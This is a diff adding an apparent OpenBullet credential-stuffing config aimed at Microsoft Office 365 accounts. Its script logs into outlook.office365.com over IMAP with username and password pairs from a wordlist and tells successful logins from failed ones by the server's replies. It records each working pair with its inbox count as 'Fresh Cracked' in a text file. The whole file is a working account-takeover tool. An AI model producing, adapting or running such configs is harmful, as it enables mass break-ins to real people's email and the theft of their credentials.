@@ -1,0 +1,61 @@
+[SETTINGS]
+{
+  "Name": "OFFICE365",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2021-11-30T23:31:21.8229593+01:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "c99",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#connect TCP Connect "outlook.office365.com" "993" 
+
+#log TCP Send "a login <USER> <PASS>\\r\\n" -> VAR "log" 
+
+TCP Send "a select inbox\\r\\n" -> VAR "in" 
+
+PARSE "<in>" LR "*" "EXISTS" CreateEmpty=FALSE -> CAP "INBOX" 
+
+#KEY KEYCHECK BanOn4XX=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "<log>" Contains "a NO LOGIN failed" 
+    KEY "<log>" Contains "a BAD Command Argument Error" 
+    KEY "<log>" Contains "a NO" 
+  KEYCHAIN Success OR 
+    KEY "<log>" Contains "a OK LOGIN completed" 
+
+#Disconnect TCP Disconnect -> VAR "disconnect" 
+
+PARSE "<INBOX>" LR "" "" CreateEmpty=FALSE -> CAP "x" "Office365 | N/A | Fresh Cracked / Inbox : " " | office.com | <USER> | <PASS>" 
+
+UTILITY List "x" Join "\\n" -> VAR "out" 
+
+UTILITY File "office365.txt" AppendLines "<x>" 
+
